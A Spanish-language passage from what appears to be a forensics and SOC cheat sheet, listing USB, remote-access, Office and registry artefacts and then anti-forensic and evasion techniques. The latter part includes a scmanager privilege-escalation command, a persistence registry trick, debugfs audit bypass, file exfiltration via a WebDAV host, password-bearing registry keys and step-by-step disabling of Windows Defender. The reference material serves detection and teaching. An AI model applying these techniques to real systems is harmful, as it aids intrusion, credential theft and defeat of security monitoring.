Verificar si el archivo **".sudo_as_admin_successful"** está en el directorio de inicio del usuario. Si se encuentra, entonces el atacante ejecutó el comando "sudo".

### ▶️ Artefactos en dispositivos USB (Windows, Linux y MacOS)

`Windows`

Ramas del registro USB a analizar:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Portable Devices\Devices
HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceClasses
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\SWD\WPDBUSENUM
HKEY_USERS\SID\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Portable Devices
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\EMDMgmt
```

Otros artefactos USB a analizar:
```
C:\Windows\System32\winevt\Logs\Microsoft-Windows-DriverFrameworks-UserMode%4Operational.evtx (Windows 7)
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Storage-ClassPnP/Operational.evtx 
C:\Windows\System32\winevt\Logs\Microsoft-Windows-WPD-MTPClassDriver/Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Partition%4Diagnostic.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Ntfs%4Operational.evtx
C:\Windows\INF\setupapi.dev.log
C:\Windows\INF\setupapi.dev.yyyymmdd_hhmmss.log
C:\Windows\setupapi.log
C:\Users\<user account>\AppData\Roaming\Microsoft\Windows\Recent\<Lnk files>

Carpeta "Windows.old"
Volume Shadow Copies
```

**Event ID 6416**: El Sistema reconoció un nuevo dispositivo externo. 
- https://learn.microsoft.com/es-es/windows/security/threat-protection/auditing/event-6416

**Logman**: Capturar el seguimiento de eventos de USBs. 
- https://learn.microsoft.com/es-es/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace

`Linux`

- Distribuciones basadas en Debian
```
/var/log/syslog
```

- Distribuciones basadas en Red Hat

Habilitar un registro detallado USB configurando "EnableLogging=1" en el fichero "/etc/usb_modeswitch.conf".
```
/var/log/messages

/var/log/usb_modeswitch_<interface name>
```

`Mac OSX`
```
/private/var/log/kernel.log
/private/var/log/kernel.log.incrementalnumber.bz2
/private/var/log/system.log
/private/var/log/system.log.incrementalnumber.gz
```

`Herramientas de terceros`
- USBDeview: https://www.nirsoft.net/utils/usb_devices_view.html
- USB Forensic Tracker (USBFT) Windows, Linux y MacOS: https://www.orionforensics.com/forensics-tools/usb-forensic-tracker

### ▶️ Análisis Forense de logs en AnyDesk, Team Viewer y LogMeIn 

`AnyDesk`

Artefactos AnyDesk. 

El registro "ad.trace" revela información como:
- IP remota desde donde se conectó el actor
- Actividad de transferencia de archivos

```
%ProgramData%\AnyDesk\ad_svc.trace
%AppData%\Anydesk\ad.trace
```

En el log "ad.trace" de la carpeta del usuario *AppData* buscamos por los criterios "files" y "app.prepare_task". Esto revelará desde qué carpeta se están copiando los archivos y también la cantidad de archivos copiados.

En el mismo fichero buscamos por el término "External address" y esto revelará la dirección IP remota donde se conectó el actor malicioso.

`Team Viewer`

Team Viewer - Referencia logs: 
- https://community.teamviewer.com/Spanish/kb/articles/4694-como-localizar-los-archivos-de-registro

Team Viewer - Arquitectura de seguridad en comunicaciones: 
- https://static.teamviewer.com/resources/2020/11/security-encryprion-1.jpg

`LogMeIn`

Artefactos LogMeIn.
```
C:\Program Data\LogMeIn
C:\Users\<username>\AppData\Local\LogMeIn
```
```
SOFTWARE\LogMeIn\Toolkit\DesktopSharing
SOFTWARE\LogMeIn\V5 LogMeIn\Toolkit\Filesharing
SOFTWARE\LogMeIn\V5
SOFTWARE\LogMeIn Ignition
```

### ▶️ Conocer la URL de descarga de un archivo (Zone.Identifier)

Saber si un archivo malicioso se descargó de Internet y desde que URL o se creó en el sistema local.

PowerShell
```
Get-Content -Path .\<FileName> -Stream Zone.Identifier -Encoding oem
```

CMD
```
notepad <FileName>:Zone.Identifier
```

### ▶️ Artefactos forense - MS Word

`Eventos de alertas MS Office`

```
Event Viewer > Applications and Services Logs > Microsoft Office Alerts
```

`Conocer las URLs visitadas desde Word`

¿Cómo saber si la víctima hizo clic en una URL maliciosa de un documento de MS Word? 

El valor de **"UseRWHlinkNavigation"** contiene la última URL a la que se accedió desde MS Word.
```
HKEY_USERS\<SID>\SOFTWARE\Microsoft\Office\16.0\Common\Internet
```

La siguiente rama contiene subclaves con los destinos remotos que MS Word estaba tratando de alcanzar.
```
HKEY_USERS\<SID>\SOFTWARE\Microsoft\Office\16.0\Common\Internet\Server Cache
```

`Ficheros abiertos recientemente en Word`

Revisar el siguiente directorio y el contenido del fichero **"inditex.dat"**.
```
%AppData%\Microsoft\Office\Recent
```

`Ficheros de inicio en Word`

Cuando un usuario inicia MS Word los archivos de esta ubicación se cargan automáticamente. Estos archivos estarán en formato .dot, .dotx o .dotm.
```
%AppData%\Microsoft\Word\STARTUP
```

`Buscar archivos recientes con macros habilitadas`

Contiene una lista de nombres de archivo. Los valores con "FF FF FF 7F" al final, indican que tienen la macro habilitada.
```
HKCU\SOFTWARE\Microsoft\Office\<version>\Word\Security\TrustedDocuments\TrustRecords
```

`Macros de seguridad en Word`

**"VBAWarnings"** indica el estado de las macros de seguridad.

- Valor 1: todas las macros están habilitadas
- Valor 2: todas las macros están desactivadas con notificación 
- Valor 3: todas las macros están desactivadas excepto las firmadas digitalmente.
- Valor 4: todas las macros están desactivadas sin notificación.

```
HKCU\Software\Policies\Microsoft\Office\<version>\Word\Security\VBAWarnings
```

`Caché de Word`

Esta ubicación se utiliza para almacenar los archivos *scratch* de MS Word. Si un usuario abre un archivo .docx con macro, Word puede crear un archivo *"WRCxxxx.tmp"*. Este archivo puede contener varios artefactos.
```
%LocalAppdata%\Microsoft\Windows\INetCache\Content.Word
```

`Archivos adjuntos Word abiertos desde Outlook`

Los archivos adjuntos tipo Word abiertos en directamente a través de en Outlook (en preview) se almacenan en esta ubicación.
```
%LocalAppdata%\Microsoft\Windows\INetCache\Content.Outlook\<Folder>\
```

### ▶️ Analizar malware en fichero XLSX (MS Excel)

Descomprimir el fichero .xlsx, dentro de la carpeta "XL" abrir editando el archivo llamado "workbook.xml", buscar el término **"absPath"**. Contiene la última ubicación de guardado del archivo donde veríamos al autor (C:\\<\user>\\..\\file.xlsx).

Como técnica anti forense esta metadata se puede eliminar desde Excel "inspeccionando el documento" y borrando las "propiedades de documento e información personal". 

### ▶️ Asignación de IPs en equipos

En un incidente se descubre que se envió un paquete de red mal formado desde una dirección IP, pero el atacante elimina dicho registro. Se puede consultar la siguiente rama del registro para encontrar el equipo en la red que tenía esa dirección IP. Cada subclave tendrá un registro DHCP con los valores DhcpIPAddress, DhcpNameServer, etc.
```
HKLM\SYSTEM\ControlSet00*\Services\Tcpip\Parameters\Interfaces
```

### ▶️ Windows Firewall (wf.msc): Reglas residuales de software desintalado

Comprobar las reglas de entrada y salida en Windows Firewall **"wf.msc"**. Un actor malicioso podría haber instalado software que creó reglas de firewall. La mayoría de las aplicaciones no borran estas reglas, incluso cuando se desinstala.

### ▶️ Persistencia: suplantación de procesos del sistema

Detección de 2 procesos con el mismo PID pero diferentes direcciones de memoria, podría indicar un proceso de inyección malicioso. 

Algunos ejemplos en procesos conocidos.
```
Process: explorer.exe | Pid: 547  | Address: 0xa20000
Process: explorer.exe | Pid: 547  | Address: 0x5d1000

Process: svchost.exe  | Pid: 1447 | Address: 0x6d0000
Process: svchost.exe  | Pid: 1447 | Address: 0x210000

Process: rundll32.exe | Pid: 5287 | Address: 0xa90000
Process: rundll32.exe | Pid: 5287 | Address: 0x6a1000
```

### ▶️ Detectar malware Linux fileless (memfd)

Estos malware asignan bytes maliciosos en la memoria y se ejecutan. Una forma de detección es usar *memfd* para cualquier proceso y esto nos puede indicar malware sin archivos (fileless). 

```bash
cat /proc/*/maps | grep "memfd"
```

### ▶️ SANS - Posters & Cheat Sheets (DFIR)

- Referencia: https://www.sans.org/posters/?focus-area=digital-forensics


---


# 📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense

### ▶️ Comando Windows: net y net1

El comando "net1" funcionará igual que el comando "net".
```cmd
net1 accounts
net accounts
```

### ▶️ *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria
Si un actor malicioso accede a un archivo crítico, este puede estar auditado y los investigadores de SOC recibirán una alerta. Pero, si se usan el comando "*debugfs*" para acceder al archivo, es posible omitir esta alerta.
- https://gtfobins.github.io/gtfobins/debugfs
```bash
df -h
sudo debugfs /dev/sda1
debugfs: ls
debugfs: cat /etc/passwd
... modo interactivo ...
```

### ▶️ WAF Bypass (SSRF): usar acortamiento IP local

| Bloqueo            | Bypass           |
|--------------------|------------------|
| http://10.0.0.1    | http://1.1       |
| http://127.0.0.1   | http://127.1     |
| http://192.168.0.5 | http://192.168.5 |

### ▶️ Post-Explotación - PrivEsc con scmanager
LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager).

- https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager

```cmd
sc.exe sdset scmanager D:(A;;KA;;;WD)
[SC] SetServiceObjectSecurity SUCCESS
```

### ▶️ Comando history

Las líneas de historial con el sufijo * (asterisco) significa que ha sido modificado. Por ejemplo, usando la tecla hacia arriba (↑), se edita y luego se vuelve a presionar hacia arriba para cambiar a otro comando histórico sin presionar Enter. Cuando se vuelva a ejecutar history se verá que un comando del histórico a sido modificado pero no se sabrá cual fue el comando inicial ejecutado.

```bash
$ sudo bash malware.sh
$ history
    1  clear
    2  sudo bash malware.sh
    3  history
```

Presionar tecla hacia arriba (↑), modificar la cadena de texto, sin pulsar Enter volver cambiar a otro comando pasado pulsando nuevamente la tecla hacia arriba (↑), eliminar y volver ejecutar history para comprobar que el comando inicial no a sido almacenado sino sustituido sin ejecución.
```bash
$ sudo bash software.sh
$ history
    1  clear
    2* bash software.sh
    3  history
```

### ▶️ Deshabilitar el uso del historial en la Shell

Un actor malicioso puede ejecutar estos comandos para no guardar o registrar en el archivo .bash_history el historial de acciones en la shell como técnica anti forense y evitar ser detectados.
```bash
export HISTFILE=/dev/null
export HISTFILESIZE=0
```

### ▶️ DLL Hijacking *cscapi.dll*
Windows Explorer carga automáticamente cscapi.dll que nunca se encuentra. Podría se aprovechada para ejecutar un payload.

- https://twitter.com/D1rkMtr/status/1613568545757220864

```cmd
C:\Windows\cscapi.dll
```

### ▶️ Otra técnica de ejecución de CMD o PowerShell

Un actor malicioso puede crear en una nueva línea de comandos en Powershell con el comando "query", de forma que pueda generar persistencia en el sistema. Si previamente ejecuta el siguiente comando.
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Utilities\query" /v pwned /t REG_MULTI_SZ /d 0\01\0pwned\0powershell.exe
```

Al consultar la rama del registro se ejecutará una Powershell.exe.
```cmd
query pwned
```

La detección puede ser complicada si se reemplaza "powershell.exe" por un ejecutable malicioso o tipo [LOLbin](https://lolbas-project.github.io/).

### ▶️ Uso de *type* para descargar o subir ficheros

1. Alojar un servidor WebDAV con acceso anónimo r/w
2. Download: 
```cmd
type \\webdav-ip\path\file.ext > C:\path\file.ext
```
3. Upload: 
```cmd
type C:\path\file.ext > \\webdav-ip\path\file.ext
```

### ▶️ Forensia (Anti-Forensic)

Herramienta antiforense para Red Teamers, utilizada para borrar algunas huellas en la fase posterior a la explotación.

- https://github.com/PaulNorman01/Forensia

### ▶️ Bloquear conexiones USB: Rubber Ducky y Cactus WHID

- HID - Hardware ID 
- VID - Vendor ID
- PID - Product ID

**Rubber Ducky**.
```
HID\VID_03EB&PID_2401&REV_0100
```

**Cactus WHID** (whid-injector).
```
HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02
HID\VID_1B4F&PID_9208&MI_02&Col02
```

```ps
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDs' -Value 1 -PropertyType DWord
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDsRetroactive' -Value 1 -PropertyType DWord

New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_03EB&PID_2401&REV_0100' -Value 1 -PropertyType String
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&MI_02&Col02' -Value 1 -PropertyType String
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02' -Value 1 -PropertyType String
```

### ▶️ Claves de registro de Windows donde se almacenan las contraseñas

Claves de registro de Windows donde se almacenan las contraseñas del sistema y de herramientas de terceros más comunes, buscadas en fases de Post-Explotación. 

Las claves se ordenan de mayor a menor ocurrencia.
```
KLM\Software\RealVNC\WinVNC4
HKCU\Software\SimonTatham\PuTTY\Sessions
HKCU\Software\ORL\WinVNC3\Password
HKLM\SYSTEM\Current\ControlSet\Services\SNMP
HKCU\Software\Polices\Microsoft\Windows\Installer
HKLM\SYSTEM\CurrentControlSet\Services\SNMP
HKCU\Software\TightVNC\Server
HKCU\Software\OpenSSH\Agent\Keys
HKLM\SYSTEM\CurrentControlSet\Control\LSA
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
HKLM\Software\RealVNC\vncserver
HKLM\Software\RealVNC\WinVNC4\Password
HKLM\Software\RealVNC
HKCU\Software\PremiumSoft\Navicat\Servers
HKLM\SYSTEM
HKLM\SAM
HKCU\Software\PremiumSoft\NavicatMONGODB\Servers
HKCU\Software\PremiumSoft\NavicatMSSQL\Servers
HKCU\Software\PremiumSoft\NavicatPG\Servers
HKCU\Software\PremiumSoft\NavicatSQLite\Servers
HKCU\Software\PremiumSoft\NavicatMARIADB\Servers
HKCU\Software\PremiumSoft\NavicatOra\Servers
HKCU\Software\TigerVNC\WinVNC4
```

### ▶️ WDigest Authentication: Habilitado / Deshabilitado

Si un malware habilita la "Autenticación WDigest" las contraseñas se almacenarán en texto claro en LSASS y en la memoria. En Windows 10 está deshabilitado de forma predeterminada.
```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest

Habilitado:    UseLogonCredential = 1
Deshabilitado: UseLogonCredential = 0
```

### ▶️ Detectar si un sistema es una máquina virtual con PowerShell o WMIC

PowerShell
```ps
Get-MpComputerStatus | Select-Object "IsVirtualMachine" | fl
```

CMD
```cmd
WMIC BIOS > wmic_bios.txt

...
BIOSVersion     SMBIOSBIOSVersion
{"VBOX  -1"}    VirtualBox
...
```

### ▶️ Técnicas de ofuscación en la ejecucación de comandos en Windows

- https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation


### ▶️ Detectar acciones de AutoRun al abrir una Command Prompt (cmd)

Un atacante creó un valor *"AutoRun"* en la siguiente clave de registro, aquí pudo agregar un comando malicioso como sus datos de valor. Ahora, cada vez que se inicie una consola cmd este comando se ejecutará automáticamente.
```
HKLM\SOFTWARE\Microsoft\Command Processor
```

### ▶️ Extensiones ejecutables alternativas a .exe

Un atancante puede renombrar la extensión de un fichero malicioso a extensiones como: 

- **.pif**, **.scr** o **.com**

Todas se ejecutarán de la misma forma que .exe.

### ▶️ Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (tipo de flujo NTFS en directorios $INDEX_ALLOCATION)

Un posible actor malicioso podría crear una carpeta visible a través de línea de comandos ejecutando un dir y/o también verla en un explorador de Windows. 

En ambas situaciones no es posible acceder a este directorio debibo a que el nombre no a sido creado como lo vemos en pantalla o en el output de consola, sino que es posible que haya sido creado con un punto al final del nombre, estableciendo un tipo de flujo *$INDEX_ALLOCATION* y un nombre de flujo *$I30* o vacío, ambos son equivalentes. 

```
md <nombre_carpeta>.::$index_allocation
md <nombre_carpeta>.:$I30:$index_allocation
```

De esta forma aparecerá el nombre del cirectorio seguido de un punto, pero cuando se intente acceder a el ya sea de forma gráfica con doble clic o vía consola con "cd" se mostrará un mensaje de error indicando que la "ubicación no está disponible o no es correcta para ese equipo". Una manera de solucionar esto sería acceder vía "cd" en consola e indicando: "*nombre carpeta.+flujo vacío+tipo de flujo*". (Esto no está soportado en Powershell)

```
cd <nombre_carpeta>.::$index_allocation
cd <nombre_carpeta>.:$I30:$index_allocation
```

- Flujos NTFS: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3

Ejemplo
```
C:\malware>md test1
C:\malware>tree
Listado de rutas de carpetas
El número de serie del volumen es FFFFFF65 AC06:D3EE
C:.
├───test1
C:\malware>cd test1
C:\malware\test1>cd ..
C:\malware>md test2.::$index_allocation
C:\malware>tree
Listado de rutas de carpetas
El número de serie del volumen es FFFFFF65 AC06:D3EE
C:.
├───test1
└───test2.
C:\malware>cd test2.
El sistema no puede encontrar la ruta especificada.
C:\malware>cd test2.::$index_allocation
C:\malware\test2.::$index_allocation>cd ..
C:\malware>
```

### ▶️ Auditoría en el uso privilegiado de los siguientes comandos
Los siguientes comandos privilegiados deberían auditarse:
|   |   |   |   |   |   |
|:-:|:-:|:-:|:-:|:-:|:-:|
| agetty | cvsbug | fdisk | ipcs | mkswap | quotacheck |
| arp | debugfs | fsck | lpc |mountd | quotaoff |
| badblocks | dmesg | ftpd | lpd | nfsd | quotaon |
| Cfdisk | dumpe2fs | inetd | makedev | nslookup | renice | 
| Chroot | e2fsck | init | mke2fs | overchan | repquota |
| Crond | edquota | nndstart | mkfs | plipconfig | rpcinfo |
| ctrlaltdel | fdformat | ipcrm | mklost+found | portmap |

Los siguientes comandos no se instalan por defecto, no obstante en caso de instalarse por requerimientos del sistema deberían también ser auditados: 
|   |   |   |   |   |   |
|:-:|:-:|:-:|:-:|:-:|:-:|
| archive | expire | klogd | newsdaily | pppd | rpcrwalld |
| buffchan | expireover | named-xfer | newslog | pppstats | rquotad |
| chat | fastrm | named | newsrequeue | prunehistory | rpcrquotad |
| comsat | filechan | namedreload | nnrpd | rarp | rshd |

### ▶️ Deshabilitar Windows Defender para eludir la detección de AMSI en la ejecución de binarios maliciosos (renombrar MsMpEng.exe a través del registro ControlSet00X)
Una forma de poder eludir el sistema de protección por defecto de Windows es renombrar el fichero del proceso de ejecución del servicio de Windows Defender. De forma que al iniciar el sistema este no se pueda ejecutar al no encontrar correctamente el nombre de este fichero que levanta el proceso de servicio de Windows Defender. Esto permite a actores maliciosos poder ejecutar binarios maliciosos como por ejemplo Mimikatz u otros.

**MsMpEng.exe** es el proceso principal de la aplicación antimalware Windows Defender. Windows Defender viene preinstalado en Windows 11 y Windows 10, ubicado en "*C:\Program Files\Windows Defender\MsMpEng.exe*"

Este proceso no se puede modificar renombrándolo ya que está constantantemente en uso, aunque se esté en contexto de usuario privilegiado como administrador. Pero lo que si es posible es renombrar la llamada de este fichero en el inicio del sistema, editando previamente las claves de registro correspondientes de "ControlSet00X" de forma offline: exportando, modificando la extensión del valor modificado de MsMpEng, creando una nueva clave ControlSet donde se importará este cambio, cambiar los valores por defecto del sistema a esta nueva clave para que inicie por defecto el sistema asignando este nuevo ControlSet y finalmente reiniciar el equipo.

1. Regedit > export hive: `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001` > guardar en nuevo fichero reg1.dat.
2. Editar desde [HxD](https://mh-nexus.de/en/hxd): 
    - Abrir reg1.dat > buscar "msmpeng.exe" > establecer "text encoding: Unicode UTF-16".
3. Renombrar extensión: "msmpeng.exe" en "msmpeng.xxx" > guardar reg1.dat.
4. Regedit > crear nueva key vacía > `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet007` > import reg1.dat.
5. Por orden ControlSet001 es la rama que el sistema carga por defecto al iniciarse. Cambiar el orden de esta prioridad en la rama "HKLM\SYSTEM\Select" correspondiente del ControlSet creado anteriormente y correspondiente a ControlSet007:
    - Cambiar `HKEY_LOCAL_MACHINE\SYSTEM\Select` > "Current" > Value: 7
    - Cambiar `HKEY_LOCAL_MACHINE\SYSTEM\Select` > "Default" > Value: 7
    - Cambiar `HKEY_LOCAL_MACHINE\SYSTEM\Select` > "LastKnowGood" > Value: 7
6. Reiniciar equipo.
